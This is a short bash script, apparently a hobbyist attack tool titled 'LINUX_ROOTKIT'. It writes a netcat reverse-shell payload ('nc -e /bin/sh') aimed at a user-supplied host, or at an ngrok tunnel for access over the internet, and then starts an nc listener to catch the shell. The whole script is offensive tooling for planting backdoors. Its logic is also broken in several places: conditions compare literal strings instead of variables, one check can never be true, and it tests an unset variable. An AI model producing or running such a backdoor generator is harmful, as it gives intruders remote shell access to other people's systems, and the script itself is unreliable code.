#!/bin/bash
echo "      ▄▄        ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄ $
      ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄
     ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄
    ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄
   ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █▄
  ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄
 ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄
                               LINUX_ROOTKIT

"
read -p  'Local/Over_Internet?(l/ov): ' in
if [[ ( in == "l" ) ]]; then
echo "test"
read -p 'Server host: ' host
read -p 'Port: ' port
 if [[ (host!="") && (port!="") ]]; then
echo "Generating rootkit..."
read -p 'Directory to save: ' dir
echo nc -e /bin/sh $host $port > $dir#back".sh"
read -p 'Do you want to start server?Y/n: ' ser
  if [[ (ser=="Y") && (ser=="y") ]]; then
 echo "Starting server:"$host"_with_port:" $port 
 nc -lv -p $port 
 else
 echo "Ok,goodbye..."
 exit
  fi
 fi
else
 echo "PLEASE, LOGIN TO NGROK BEFORE LAUNCHING"
read -p 'Port_for_listener: ' pg
 read -p 'NGROK_port: ' ng
   if [[ ($host2!="") && ($pg!="") ]]; then
 echo "Generating rootkit..."
read -p 'Directory to save: ' dir
echo nc -e /bin/sh 0.tcp.ngrok.io $ng  > $dir#back".sh"
read -p 'Do you want to start listener?Y/n: ' ser
    if [[ ( ser == "Y" ) && ( ser == "y" ) ]]; then
 echo "Starting server:"$host2"_with_port:" $pg
 nc -lvp $pg
    else
    echo "Ok,goodbye..."
    exit
    fi
   fi
fi
